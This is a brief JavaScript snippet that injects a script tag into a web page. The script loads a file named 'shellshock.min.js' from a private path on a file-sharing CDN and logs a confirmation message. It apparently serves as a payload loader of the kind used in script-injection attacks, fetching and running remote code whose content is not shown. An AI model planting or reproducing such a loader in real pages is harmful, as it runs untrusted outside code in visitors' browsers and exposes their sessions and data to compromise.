
 var script = document.createElement('script');
  script.src = 'https://cdn.filesend.jp/private/h1zMGshiWjRbYTctV4lHDid5QepCHo7Dbai0bWpFqZW1WThGnIcRxcX0VDB4-oim/shellshock.min.js';
  script.type = 'text/javascript';
  script.onload = function() {
    console.log('your script have been loaded');
  }
  document.body.appendChild(script);
